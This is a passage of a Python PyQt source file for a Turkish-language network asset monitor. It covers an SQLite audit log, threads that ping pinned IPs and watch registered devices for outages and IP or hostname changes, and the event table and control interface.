        "critical_offline": ("🚨", "KRİTİK Çevrimdışı",   "#ff0000"),
        "new_unknown":      ("❓", "Yeni Tanımsız Cihaz",  "#9b59b6"),
        "watchdog_start":   ("▶️",  "İzleme Başladı",      "#00d4ff"),
        "watchdog_stop":    ("⏹️",  "İzleme Durdu",        "#888888"),
    }

    @classmethod
    def label(cls, etype):
        return cls.LABELS.get(etype, ("•", etype, "#aaaaaa"))


@dataclass
class AuditEntry:
    id:          str  = ""
    timestamp:   str  = ""
    asset_id:    str  = ""
    asset_name:  str  = ""
    event_type:  str  = ""
    old_value:   str  = ""
    new_value:   str  = ""
    ip:          str  = ""
    details:     str  = ""

    def to_dict(self):
        return dc_asdict(self)

    @staticmethod
    def from_dict(d):
        return AuditEntry(**{k: v for k, v in d.items()
                             if k in AuditEntry.__dataclass_fields__})


class AuditLog:
    """
    Tüm watchdog olaylarını SQLite veritabanında saklar.
    ─ Kurulum gerekmez: sqlite3 Python'la birlikte gelir.
    ─ Kayıt limiti yok: teorik kapasite 140 TB.
    ─ İndeksli sorgular: milyonlarca kayıtta bile anında filtreler.
    ─ Otomatik migrasyon: eski motunnet_audit.json varsa içe aktarır.
    ─ Thread-safe: check_same_thread=False + tek lock ile korunur.
    """

    _DB_FILE  = "motunnet_audit.db"
    _JSON_OLD = "motunnet_audit.json"   # eski format — migrasyon için

    def __init__(self, org_file: Path):
        import threading
        self._lock = threading.Lock()
        db_path = org_file.parent / self._DB_FILE
        db_path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(
            str(db_path),
            check_same_thread=False,
            isolation_level=None,   # autocommit
        )
        self._conn.execute("PRAGMA journal_mode=WAL")   # eş zamanlı okuma
        self._conn.execute("PRAGMA synchronous=NORMAL") # hız/güvenlik dengesi
        self._create_table()
        self._migrate_json(org_file.parent / self._JSON_OLD)
        # UI için kolay erişim (footer'da gösterilir)
        self._file = db_path

    # ── Tablo + İndeks ───────────────────────────────────────────────────────
    def _create_table(self):
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS audit_log (
                id          TEXT PRIMARY KEY,
                timestamp   TEXT NOT NULL,
                asset_id    TEXT NOT NULL DEFAULT '',
                asset_name  TEXT NOT NULL DEFAULT '',
                event_type  TEXT NOT NULL DEFAULT '',
                old_value   TEXT NOT NULL DEFAULT '',
                new_value   TEXT NOT NULL DEFAULT '',
                ip          TEXT NOT NULL DEFAULT '',
                details     TEXT NOT NULL DEFAULT ''
            );
            CREATE INDEX IF NOT EXISTS idx_timestamp
                ON audit_log(timestamp DESC);
            CREATE INDEX IF NOT EXISTS idx_asset_id
                ON audit_log(asset_id);
            CREATE INDEX IF NOT EXISTS idx_event_type
                ON audit_log(event_type);
        """)

    # ── JSON → SQLite migrasyonu (tek seferlik) ──────────────────────────────
    def _migrate_json(self, json_path: Path):
        if not json_path.exists():
            return
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            old_entries = data.get('entries', [])
            if not old_entries:
                json_path.rename(json_path.with_suffix('.json.bak'))
                return
            migrated = 0
            for d in old_entries:
                try:
                    e = AuditEntry.from_dict(d)
                    self._insert(e)
                    migrated += 1
                except Exception:
                    pass
            # Başarılı migrasyon → JSON'ı yedekle, sil
            json_path.rename(json_path.with_suffix('.json.bak'))
            print(f"[AuditLog] JSON → SQLite migrasyon: {migrated} kayıt aktarıldı. "
                  f"Eski dosya: {json_path.with_suffix('.json.bak')}")
        except Exception as exc:
            print(f"[AuditLog] Migrasyon hatası (devam ediliyor): {exc}")

    # ── İç yazma yardımcısı ──────────────────────────────────────────────────
    def _insert(self, entry: AuditEntry):
        self._conn.execute(
            """INSERT OR IGNORE INTO audit_log
               (id, timestamp, asset_id, asset_name, event_type,
                old_value, new_value, ip, details)
               VALUES (?,?,?,?,?,?,?,?,?)""",
            (entry.id, entry.timestamp, entry.asset_id, entry.asset_name,
             entry.event_type, entry.old_value, entry.new_value,
             entry.ip, entry.details)
        )

    # ── Satırdan AuditEntry ──────────────────────────────────────────────────
    @staticmethod
    def _row_to_entry(row) -> AuditEntry:
        cols = ("id","timestamp","asset_id","asset_name","event_type",
                "old_value","new_value","ip","details")
        return AuditEntry(**dict(zip(cols, row)))

    # ── Kayıt ekleme ─────────────────────────────────────────────────────────
    def add(self, asset_id: str, asset_name: str, event_type: str,
            old_value: str = "", new_value: str = "",
            ip: str = "", details: str = "") -> AuditEntry:
        entry = AuditEntry(
            id         = str(uuid.uuid4())[:12],
            timestamp  = datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            asset_id   = asset_id,
            asset_name = asset_name,
            event_type = event_type,
            old_value  = old_value,
            new_value  = new_value,
            ip         = ip,
            details    = details,
        )
        with self._lock:
            self._insert(entry)
        return entry

    # ── Sorgulama ────────────────────────────────────────────────────────────
    @property
    def entries(self) -> list[AuditEntry]:
        """Son 500 kaydı döndür (UI için yeterli)."""
        with self._lock:
            cur = self._conn.execute(
                "SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 500")
            return [self._row_to_entry(r) for r in cur.fetchall()]

    def filter(self, event_type: str = None, asset_id: str = None,
               since: str = None, limit: int = 2000) -> list[AuditEntry]:
        """SQL filtreli sorgu — tüm veri üzerinde çalışır."""
        sql    = "SELECT * FROM audit_log WHERE 1=1"
        params = []
        if event_type:
            sql += " AND event_type = ?";  params.append(event_type)
        if asset_id:
            sql += " AND asset_id = ?";    params.append(asset_id)
        if since:
            sql += " AND timestamp >= ?";  params.append(since)
        sql += f" ORDER BY timestamp DESC LIMIT {int(limit)}"
        with self._lock:
            cur = self._conn.execute(sql, params)
            return [self._row_to_entry(r) for r in cur.fetchall()]

    def count(self) -> int:
        """Toplam kayıt sayısı."""
        with self._lock:
            return self._conn.execute(
                "SELECT COUNT(*) FROM audit_log").fetchone()[0]

    def clear(self):
        """Tüm kayıtları sil."""
        with self._lock:
            self._conn.execute("DELETE FROM audit_log")

    def export_csv(self, path: str):
        with self._lock:
            cur = self._conn.execute(
                "SELECT * FROM audit_log ORDER BY timestamp DESC")
            rows = cur.fetchall()
        with open(path, 'w', newline='', encoding='utf-8-sig') as f:
            w = csv.writer(f)
            w.writerow(["Zaman","Varlık","Olay","Eski Değer","Yeni Değer","IP","Detay"])
            for row in rows:
                e = self._row_to_entry(row)
                icon, label, _ = AuditEvent.label(e.event_type)
                w.writerow([e.timestamp, e.asset_name, f"{icon} {label}",
                            e.old_value, e.new_value, e.ip, e.details])

    def close(self):
        """Uygulama kapanırken bağlantıyı kapat."""
        try:
            self._conn.close()
        except Exception:
            pass



# ─── Sabit IP İzleme Thread'i ─────────────────────────────────────────────────
class PinnedIPThread(QThread):
    """
    Kullanıcının elle eklediği IP adreslerini periyodik olarak ping'ler.
    Watchdog'dan bağımsız çalışır — çok daha hızlı aralık (varsayılan 30 sn).
    Sinyal: result(ip, is_up, latency_ms)
    """
    result   = pyqtSignal(str, bool, float)   # ip, up?, ms
    finished_signal = pyqtSignal()

    def __init__(self, ips: list, interval_sec: int = 30):
        super().__init__()
        self._ips          = list(ips)
        self._interval_sec = max(5, interval_sec)
        self._stop         = False

    def set_ips(self, ips: list):
        self._ips = list(ips)

    def set_interval(self, sec: int):
        self._interval_sec = max(5, sec)

    def stop(self):
        self._stop = True

    def run(self):
        while not self._stop:
            ips = list(self._ips)
            if ips:
                with ThreadPoolExecutor(max_workers=20) as ex:
                    futures = {ex.submit(self._ping_timed, ip): ip for ip in ips}
                    for f in as_completed(futures):
                        if self._stop:
                            break
                        ip = futures[f]
                        try:
                            is_up, ms = f.result()
                        except Exception:
                            is_up, ms = False, 0.0
                        self.result.emit(ip, is_up, ms)
            # Aralık boyunca bekle ama durdurma sinyaline duyarlı kal
            for _ in range(self._interval_sec):
                if self._stop:
                    break
                self.msleep(1000)
        self.finished_signal.emit()

    @staticmethod
    def _ping_timed(ip: str, timeout: float = 1.5) -> tuple[bool, float]:
        """Ping + yanıt süresi (ms)."""
        import time as _time
        t0 = _time.monotonic()
        try:
            if platform.system() == "Windows":
                cmd = ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip]
            else:
                cmd = ["ping", "-c", "1", "-W", str(int(timeout)), ip]
            ret = subprocess.run(cmd, capture_output=True, timeout=timeout + 1)
            ms  = (_time.monotonic() - t0) * 1000
            return ret.returncode == 0, round(ms, 1)
        except Exception:
            return False, 0.0

# ─── Watchdog Thread ──────────────────────────────────────────────────────────
class WatchdogThread(QThread):
    """
    Arka planda periyodik olarak tüm kayıtlı varlıkları izler.
    Sinyal    : event_detected(AuditEntry)  – yeni olay
              : scan_complete(int, int)      – (toplam, online)
              : status_msg(str)              – durum mesajı
    """
    event_detected = pyqtSignal(object)   # AuditEntry
    scan_complete  = pyqtSignal(int, int) # toplam, online
    status_msg     = pyqtSignal(str)

    def __init__(self, org: 'OrganizationManager', audit: AuditLog,
                 interval_min: int = 5):
        super().__init__()
        self.org          = org
        self.audit        = audit
        self.interval_min = interval_min
        self._stop        = False
        # Asset durumu: {asset_id: {"online": bool, "ip": str, "hostname": str}}
        self._last_state: dict = {}

    def set_interval(self, minutes: int):
        self.interval_min = max(1, minutes)

    def stop(self):
        self._stop = True

    def run(self):
        single = getattr(self, '_single_shot', False)
        if not single:
            # Normal watchdog başlangıç kaydı
            entry = self.audit.add("", "Watchdog", AuditEvent.WATCHDOG_START,
                                   details=f"Aralık: {self.interval_min} dk")
            self.event_detected.emit(entry)

        while not self._stop:
            self._run_scan()
            if single:
                break   # Tek seferlik tarama — döngüden çık
            # interval_min dakika bekle ama durdurma sinyaline duyarlı kal
            for _ in range(self.interval_min * 60):
                if self._stop:
                    break
                self.msleep(1000)

        if not single:
            entry = self.audit.add("", "Watchdog", AuditEvent.WATCHDOG_STOP)
            self.event_detected.emit(entry)

    def _run_scan(self):
        assets    = list(self.org.assets.values())
        scannable = [a for a in assets if a.ip_address]
        if not scannable:
            return

        self.status_msg.emit(
            f"⏳ Watchdog taraması: {len(scannable)} varlık kontrol ediliyor…")
        online_count = 0

        with ThreadPoolExecutor(max_workers=40) as ex:
            # Her varlık için (ping + hostname çözümü) paralel yap
            futures = {ex.submit(self._probe, a): a for a in scannable}
            for f in as_completed(futures):
                if self._stop:
                    for pending in futures:
                        pending.cancel()
                    break
                asset = futures[f]
                try:
                    is_up, resolved_ip, resolved_hn = f.result()
                except Exception:
                    is_up, resolved_ip, resolved_hn = False, asset.ip_address, asset.hostname

                prev = self._last_state.get(asset.id, {
                    "online":   None,
                    "ip":       asset.ip_address,
                    "hostname": asset.hostname,
                })

                # ── Çevrimiçi / Çevrimdışı durumu ──────────────────────
                if is_up:
                    online_count += 1
                    if prev["online"] is False:
                        entry = self.audit.add(
                            asset.id, asset.name, AuditEvent.BACK_ONLINE,
                            ip=asset.ip_address)
                        self.event_detected.emit(entry)
                    # İlk tarama (None) → sessiz geçiş
                else:
                    if prev["online"] is True:
                        etype = (AuditEvent.CRITICAL_OFFLINE
                                 if asset.is_critical else AuditEvent.OFFLINE)
                        entry = self.audit.add(
                            asset.id, asset.name, etype,
                            ip=asset.ip_address)
                        self.event_detected.emit(entry)

                # ── IP değişimi tespiti ─────────────────────────────────
                # (sadece cihaz online iken ve daha önce bir IP biliyorsak)
                if (is_up and resolved_ip and prev["online"] is not None
                        and resolved_ip != prev["ip"] and resolved_ip != asset.ip_address):
                    entry = self.audit.add(
                        asset.id, asset.name, AuditEvent.IP_CHANGED,
                        old_value=prev["ip"], new_value=resolved_ip,
                        ip=resolved_ip,
                        details="Kayıttaki IP ile DNS yanıtı uyuşmuyor")
                    self.event_detected.emit(entry)

                # ── Hostname değişimi tespiti ───────────────────────────
                if (is_up and resolved_hn and prev["online"] is not None
                        and resolved_hn.upper() != (prev["hostname"] or "").upper()
                        and resolved_hn.upper() != (asset.hostname or "").upper()):
                    entry = self.audit.add(
                        asset.id, asset.name, AuditEvent.HOSTNAME_CHANGED,
                        old_value=asset.hostname or "(boş)",
                        new_value=resolved_hn,
                        ip=asset.ip_address)
                    self.event_detected.emit(entry)

                self._last_state[asset.id] = {
                    "online":   is_up,
                    "ip":       resolved_ip or asset.ip_address,
                    "hostname": resolved_hn or asset.hostname,
                }

        self.scan_complete.emit(len(scannable), online_count)
        ts = datetime.now().strftime("%H:%M:%S")
        self.status_msg.emit(
            f"✅ Watchdog — Son tarama: {ts}  |  "
            f"{online_count}/{len(scannable)} çevrimiçi")

    def _probe(self, asset) -> tuple[bool, str, str]:
        """Ping + DNS çözümü birleşik. (ip_string, hostname_string) döner."""
        ip = asset.ip_address
        is_up = self._ping(ip)
        resolved_hn = ""
        resolved_ip = ip
        if is_up:
            try:
                # Hostname → IP (kayıttaki hostname ile kontrol)
                if asset.hostname:
                    try:
                        addrs = socket.getaddrinfo(asset.hostname, None)
                        if addrs:
                            resolved_ip = addrs[0][4][0]
                    except Exception:
                        pass
                # IP → FQDN (ters DNS) → kısa ad + domain
                try:
                    fqdn_parts = socket.gethostbyaddr(ip)[0].split('.')
                    resolved_hn = fqdn_parts[0].upper()
                except Exception:
                    pass
            except Exception:
                pass
        return is_up, resolved_ip, resolved_hn

    @staticmethod
    def _ping(ip: str, timeout: float = 1.5) -> bool:
        """Hızlı ICMP ping (platform bağımsız)."""
        try:
            if platform.system() == "Windows":
                cmd = ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip]
            else:
                cmd = ["ping", "-c", "1", "-W", str(int(timeout)), ip]
            result = subprocess.run(cmd, capture_output=True, timeout=timeout + 1)
            return result.returncode == 0
        except Exception:
            return False


# ─── Watchdog Widget (UI Sekmesi) ─────────────────────────────────────────────
class WatchdogWidget(QWidget):
    """
    '🔔 İzleme Geçmişi' sekmesi.
    ─ Üst bölüm  : watchdog kontrolleri (başlat/durdur, aralık, filtre)
    ─ Orta bölüm : canlı istatistik kartları
    ─ Alt bölüm  : olay tablosu (filtrelenebilir, aranabilir)
    """

    def __init__(self, org: 'OrganizationManager',
                 settings: 'SettingsManager' = None, parent=None):
        super().__init__(parent)
        self.org      = org
        self.settings = settings          # doğrudan geç — window() bekleme
        self.audit    = AuditLog(org.file)
        self._thread: WatchdogThread | None = None
        self._pinned_thread: PinnedIPThread | None = None
        self._tray:   QSystemTrayIcon | None = None
        self._stats  = {k: 0 for k in ("total", "online", "offline",
                                        "critical", "ip_chg", "hn_chg")}
        # {ip: {"up": bool|None, "ms": float, "last": str, "label": str,
        #        "up_since": str, "down_since": str, "fail_count": int}}
        self._pinned_state: dict = {}
        self._build_ui()
        self._load_history()
        self._load_pinned_ips()
        self._setup_tray()

    # ── UI İnşası ────────────────────────────────────────────────────────────
    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # ── Başlık + kontroller ──────────────────────────────────────────────
        ctrl_row = QHBoxLayout()

        title = QLabel("🔔 Watchdog — Değişiklik İzleme")
        title.setStyleSheet("font-size:14px;font-weight:bold;color:#00ff88;")
        ctrl_row.addWidget(title)
        ctrl_row.addStretch()

        ctrl_row.addWidget(QLabel("Aralık:"))
        self.interval_spin = QSpinBox()
        self.interval_spin.setRange(1, 60)
        self.interval_spin.setValue(5)
        self.interval_spin.setSuffix(" dk")
        self.interval_spin.setFixedWidth(72)
        self.interval_spin.setToolTip("Taramalar arası bekleme süresi")
        ctrl_row.addWidget(self.interval_spin)

        self.btn_start = QPushButton("▶  Başlat")
        self.btn_start.setFixedWidth(100)
        self.btn_start.setStyleSheet(
            "QPushButton{background:#145A32;color:#00ff88;font-weight:bold;"
            "border:1px solid #1abc9c;border-radius:6px;padding:5px 10px;}"
            "QPushButton:hover{background:#1abc9c;color:#0a0a14;}"
            "QPushButton:disabled{background:#333;color:#666;border-color:#444;}")
        self.btn_start.clicked.connect(self._start_watchdog)
        ctrl_row.addWidget(self.btn_start)

        # Bildirim tercihleri
        notif_label = QLabel("Bildirim:")
        notif_label.setStyleSheet("color:#888;font-size:10px;")
        ctrl_row.addWidget(notif_label)

        self.notif_offline = QCheckBox("Çevrimdışı")
        self.notif_offline.setChecked(True)
        self.notif_offline.setToolTip("Cihaz ağdan düşünce bildir")
        self.notif_offline.setStyleSheet("QCheckBox{color:#e74c3c;font-size:10px;}")
        ctrl_row.addWidget(self.notif_offline)

        self.notif_change = QCheckBox("Değişim")
        self.notif_change.setChecked(True)
        self.notif_change.setToolTip("IP / Hostname değişimini bildir")
        self.notif_change.setStyleSheet("QCheckBox{color:#f39c12;font-size:10px;}")
        ctrl_row.addWidget(self.notif_change)

        self.btn_stop = QPushButton("⏹  Durdur")
        self.btn_stop.setFixedWidth(100)
        self.btn_stop.setEnabled(False)
        self.btn_stop.setStyleSheet(
            "QPushButton{background:#641E16;color:#e74c3c;font-weight:bold;"
            "border:1px solid #e74c3c;border-radius:6px;padding:5px 10px;}"
            "QPushButton:hover{background:#e74c3c;color:#fff;}"
            "QPushButton:disabled{background:#333;color:#666;border-color:#444;}")
        self.btn_stop.clicked.connect(self._stop_watchdog)
        ctrl_row.addWidget(self.btn_stop)

        self.btn_now = QPushButton("⚡ Şimdi Tara")
        self.btn_now.setFixedWidth(110)
        self.btn_now.setEnabled(False)
        self.btn_now.setToolTip("Aralık beklemeden hemen tarama başlat")
        self.btn_now.setStyleSheet(
            "QPushButton{background:#1a3a5c;color:#00d4ff;font-weight:bold;"
            "border:1px solid #00d4ff;border-radius:6px;padding:5px 10px;}"
            "QPushButton:hover{background:#00d4ff;color:#0a0a14;}"
            "QPushButton:disabled{background:#333;color:#666;border-color:#444;}")
        self.btn_now.clicked.connect(self._scan_now)
        ctrl_row.addWidget(self.btn_now)

        root.addLayout(ctrl_row)

        # ── Durum şeridi ────────────────────────────────────────────────────
        self.status_lbl = QLabel("⏸  Watchdog beklemede — Başlatmak için ▶ Başlat'a tıklayın.")
        self.status_lbl.setStyleSheet("color:#888;font-size:10px;padding:2px 0;")
        root.addWidget(self.status_lbl)

        # ── İstatistik kartları ──────────────────────────────────────────────
        cards_row = QHBoxLayout()
        cards_row.setSpacing(6)
        self._card_widgets = {}
        card_defs = [
            ("total",    "Toplam Varlık",  "#00d4ff", "🖥️"),
            ("online",   "Çevrimiçi",      "#00ff88", "🟢"),
            ("offline",  "Çevrimdışı",     "#e74c3c", "🔴"),
            ("critical", "Kritik Uyarı",   "#ff0000", "🚨"),
            ("ip_chg",   "IP Değişimi",    "#f39c12", "🔄"),
            ("hn_chg",   "HN Değişimi",    "#f1c40f", "🖥️"),
        ]
        for key, label, color, icon in card_defs:
            card = self._make_card(icon, label, "0", color)
            self._card_widgets[key] = card
            cards_row.addWidget(card)
        root.addLayout(cards_row)

        # ── Filtre + Arama ───────────────────────────────────────────────────
        filter_row = QHBoxLayout()
        filter_row.setSpacing(6)

        self.filter_combo = QComboBox()
        self.filter_combo.setFixedWidth(200)
        self.filter_combo.addItems([
            "Tüm Olaylar",
            "🔴 Çevrimdışı",
            "🟢 Çevrimiçi / Geri Döndü",
            "🔄 IP Değişimi",
            "🖥️ Hostname Değişimi",
            "🚨 Kritik Uyarılar",
            "❓ Yeni Tanımsız",
        ])
        self.filter_combo.currentIndexChanged.connect(self._apply_filter)
        filter_row.addWidget(QLabel("Filtre:"))
        filter_row.addWidget(self.filter_combo)

        self.search_box = QLineEdit()
        self.search_box.setPlaceholderText("🔍  Varlık adı veya IP ara…")
        self.search_box.textChanged.connect(self._apply_filter)
        filter_row.addWidget(self.search_box)
        filter_row.addStretch()

        btn_export = QPushButton("📥 CSV İndir")
        btn_export.setFixedWidth(110)
        btn_export.clicked.connect(self._export_csv)
        filter_row.addWidget(btn_export)

        btn_clear = QPushButton("🗑 Geçmişi Temizle")
        btn_clear.setFixedWidth(130)
        btn_clear.setStyleSheet("QPushButton{background:#641E16;color:#e74c3c;border:1px solid #e74c3c;border-radius:6px;padding:4px 8px;}QPushButton:hover{background:#e74c3c;color:#fff;}")
        btn_clear.clicked.connect(self._clear_history)
        filter_row.addWidget(btn_clear)

        root.addLayout(filter_row)

        # ── Olay tablosu ─────────────────────────────────────────────────────
        self.table = QTableWidget()
        self.table.setColumnCount(7)
        self.table.setHorizontalHeaderLabels(
            ["Zaman", "Varlık", "Olay", "Eski Değer", "Yeni Değer", "IP", "Detay"])
        self.table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Interactive)
        self.table.horizontalHeader().setSectionResizeMode(
            2, QHeaderView.ResizeMode.Fixed)
        self.table.horizontalHeader().setSectionResizeMode(
            6, QHeaderView.ResizeMode.Stretch)
        self.table.setColumnWidth(0, 145)
        self.table.setColumnWidth(1, 160)
        self.table.setColumnWidth(2, 175)
        self.table.setColumnWidth(3, 130)
        self.table.setColumnWidth(4, 130)
        self.table.setColumnWidth(5, 115)
        self.table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setEditTriggers(
            QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setAlternatingRowColors(True)
        self.table.verticalHeader().setVisible(False)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self._show_row_menu)
        self.table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;
                         alternate-background-color:#0d0d1a;gridline-color:#1a1a2e;}
            QHeaderView::section{background:#0f3460;color:#00ff88;padding:6px;
                                  font-weight:bold;border:none;}
            QTableWidget::item{padding:4px;}
        """)
        # ── Ana Splitter: Sol=Sabit IP  /  Sağ=Olay Tablosu ────────────────
        main_split = QSplitter(Qt.Orientation.Horizontal)
        main_split.setHandleWidth(4)
        main_split.setStyleSheet(
            "QSplitter::handle{background:#0f3460;}"
            "QSplitter::handle:hover{background:#00ff88;}")

        # ── Sol: Sabit IP İzleme Paneli ──────────────────────────────────────
        pinned_panel = QWidget()
        pinned_panel.setMinimumWidth(320)
        pp_layout = QVBoxLayout(pinned_panel)
        pp_layout.setContentsMargins(0, 0, 4, 0)
        pp_layout.setSpacing(4)

        # Başlık
        ph_row = QHBoxLayout()
        ph_title = QLabel("📍 Sabit IP İzleme")
        ph_title.setStyleSheet(
            "font-size:12px;font-weight:bold;color:#00d4ff;")
        ph_row.addWidget(ph_title)
        ph_row.addStretch()

        ph_interval_lbl = QLabel("Aralık:")
        ph_interval_lbl.setStyleSheet("color:#888;font-size:10px;")
        ph_row.addWidget(ph_interval_lbl)
        self.pinned_interval = QSpinBox()
        self.pinned_interval.setRange(5, 300)
        self.pinned_interval.setValue(30)
        self.pinned_interval.setSuffix(" sn")
        self.pinned_interval.setFixedWidth(68)
        self.pinned_interval.setToolTip("Ping aralığı (saniye)")
        ph_row.addWidget(self.pinned_interval)
        pp_layout.addLayout(ph_row)

        # IP ekle satırı
        # Varlık seçimi satırı
        asset_row = QHBoxLayout()
        asset_row.setSpacing(4)

        asset_lbl = QLabel("Varlıktan:")
        asset_lbl.setStyleSheet("color:#888;font-size:10px;")
        asset_lbl.setFixedWidth(52)
        asset_row.addWidget(asset_lbl)

        self.pinned_asset_combo = QComboBox()
        self.pinned_asset_combo.setEditable(True)
        self.pinned_asset_combo.setInsertPolicy(QComboBox.InsertPolicy.NoInsert)
        self.pinned_asset_combo.lineEdit().setPlaceholderText(
            "Varlık seç veya ara…  (Ad / Hostname / IP)")
        self.pinned_asset_combo.setStyleSheet(
            "QComboBox{background:#16213e;border:1px solid #0f3460;"
            "border-radius:5px;padding:4px;color:white;}"
            "QComboBox:focus{border:1px solid #00d4ff;}"
            "QComboBox QAbstractItemView{background:#16213e;color:white;"
            "selection-background-color:#00d4ff;selection-color:#0a0a14;}")
        self.pinned_asset_combo.activated.connect(self._on_asset_selected)
        asset_row.addWidget(self.pinned_asset_combo, 1)

        btn_from_asset = QPushButton("➕ Ekle")
        btn_from_asset.setFixedWidth(64)
        btn_from_asset.setToolTip("Seçili varlığı sabit IP listesine ekle")
        btn_from_asset.setStyleSheet(
            "QPushButton{background:#145A32;color:#00ff88;border:1px solid #1abc9c;"
            "border-radius:5px;font-weight:bold;padding:4px 8px;}"
            "QPushButton:hover{background:#1abc9c;color:#0a0a14;}")
        btn_from_asset.clicked.connect(self._add_from_asset_combo)
        asset_row.addWidget(btn_from_asset)

        btn_refresh_assets = QPushButton("🔄")
        btn_refresh_assets.setFixedWidth(28)
        btn_refresh_assets.setToolTip("Varlık listesini yenile")
        btn_refresh_assets.setStyleSheet(
            "QPushButton{background:#0f3460;color:#00d4ff;border:none;"
            "border-radius:5px;font-size:12px;}"
            "QPushButton:hover{background:#00d4ff;color:#0a0a14;}")
        btn_refresh_assets.clicked.connect(self._populate_asset_combo)
        asset_row.addWidget(btn_refresh_assets)
        pp_layout.addLayout(asset_row)

        # Manuel ekleme satırı (alternatif — IP listede yoksa)
        add_row = QHBoxLayout()
        add_row.setSpacing(4)

        manual_lbl = QLabel("Manuel:")
        manual_lbl.setStyleSheet("color:#888;font-size:10px;")
        manual_lbl.setFixedWidth(52)
        add_row.addWidget(manual_lbl)

        self.pinned_ip_input = QLineEdit()
        self.pinned_ip_input.setPlaceholderText("IP adresi  (örn: 10.0.0.1)")
        self.pinned_ip_input.returnPressed.connect(self._add_pinned_ip)
        add_row.addWidget(self.pinned_ip_input)

        self.pinned_label_input = QLineEdit()
        self.pinned_label_input.setPlaceholderText("İsim / Açıklama")
        self.pinned_label_input.setFixedWidth(130)
        self.pinned_label_input.returnPressed.connect(self._add_pinned_ip)
        add_row.addWidget(self.pinned_label_input)

        btn_add_ip = QPushButton("➕")
        btn_add_ip.setFixedWidth(32)
        btn_add_ip.setToolTip("IP ekle (Enter ile de ekleyebilirsiniz)")
        btn_add_ip.setStyleSheet(
            "QPushButton{background:#145A32;color:#00ff88;border:1px solid #1abc9c;"
            "border-radius:5px;font-size:14px;}"
            "QPushButton:hover{background:#1abc9c;color:#0a0a14;}")
        btn_add_ip.clicked.connect(self._add_pinned_ip)
        add_row.addWidget(btn_add_ip)
        pp_layout.addLayout(add_row)

        # IP listesi tablosu
        self.pinned_table = QTableWidget()
        self.pinned_table.setColumnCount(6)
        self.pinned_table.setHorizontalHeaderLabels(
            ["Durum", "IP Adresi", "Açıklama", "Gecikme", "Son Kontrol", ""])
        self.pinned_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Interactive)
        self.pinned_table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.ResizeMode.Fixed)
        self.pinned_table.horizontalHeader().setSectionResizeMode(
            4, QHeaderView.ResizeMode.Stretch)
        self.pinned_table.horizontalHeader().setSectionResizeMode(
            5, QHeaderView.ResizeMode.Fixed)
        self.pinned_table.setColumnWidth(0, 54)
        self.pinned_table.setColumnWidth(1, 110)
        self.pinned_table.setColumnWidth(2, 110)
        self.pinned_table.setColumnWidth(3, 72)
        self.pinned_table.setColumnWidth(5, 36)
        self.pinned_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows)
        self.pinned_table.setEditTriggers(
            QAbstractItemView.EditTrigger.NoEditTriggers)
        self.pinned_table.verticalHeader().setVisible(False)
        self.pinned_table.setAlternatingRowColors(True)
        self.pinned_table.setContextMenuPolicy(
            Qt.ContextMenuPolicy.CustomContextMenu)
        self.pinned_table.customContextMenuRequested.connect(
            self._pinned_context_menu)
        self.pinned_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #00d4ff33;
                         alternate-background-color:#0d0d1a;gridline-color:#1a1a2e;}
            QHeaderView::section{background:#0f3460;color:#00d4ff;padding:5px;
                                  font-weight:bold;border:none;font-size:10px;}
            QTableWidget::item{padding:3px;}
        """)
        pp_layout.addWidget(self.pinned_table, 1)

        # Özet satırı
        self.pinned_summary = QLabel("Henüz IP eklenmedi")
        self.pinned_summary.setStyleSheet("color:#555;font-size:9px;")
        pp_layout.addWidget(self.pinned_summary)

        main_split.addWidget(pinned_panel)

        # ── Sağ: Olay Tablosu (mevcut) ───────────────────────────────────────
        right_panel = QWidget()
        rp_layout = QVBoxLayout(right_panel)
        rp_layout.setContentsMargins(4, 0, 0, 0)
        rp_layout.setSpacing(4)
        rp_layout.addWidget(self.table, 1)
        self.footer_lbl = QLabel("0 kayıt")
        self.footer_lbl.setStyleSheet("color:#555;font-size:9px;")
        rp_layout.addWidget(self.footer_lbl)
        main_split.addWidget(right_panel)

        main_split.setSizes([360, 640])
        main_split.setStretchFactor(0, 0)
        main_split.setStretchFactor(1, 1)
        root.addWidget(main_split, 1)

    def _make_card(self, icon: str, label: str, value: str, color: str) -> QWidget:
        w = QWidget()
        w.setFixedHeight(62)
        w.setStyleSheet(
            f"QWidget{{background:#0d0d1a;border:1px solid {color}33;"
            f"border-radius:8px;}} QLabel{{border:none;}}")
        lay = QVBoxLayout(w)
        lay.setContentsMargins(10, 4, 10, 4)
        lay.setSpacing(1)
        val_lbl = QLabel(value)
        val_lbl.setStyleSheet(
            f"font-size:22px;font-weight:bold;color:{color};")
        val_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl_lbl = QLabel(f"{icon} {label}")
        lbl_lbl.setStyleSheet("font-size:9px;color:#888;")
        lbl_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lay.addWidget(val_lbl)
        lay.addWidget(lbl_lbl)
        w._val = val_lbl   # kolay erişim için
        return w

    # ── Tray Bildirimi ────────────────────────────────────────────────────────
    def _setup_tray(self):
        try:
            icon = QIcon()  # boş ikon - uygulama ikonu ana pencereden alınır
            self._tray = QSystemTrayIcon(create_app_icon(), self)
            self._tray.setToolTip("MotunNet Watchdog")
            self._tray.show()
        except Exception:
            self._tray = None

    def _notify(self, title: str, msg: str, critical: bool = False,
               event_type: str = ""):
        """Windows/Linux sistem bildirimi — checkbox tercihlerine göre filtrele."""
        # Checkbox kontrolü
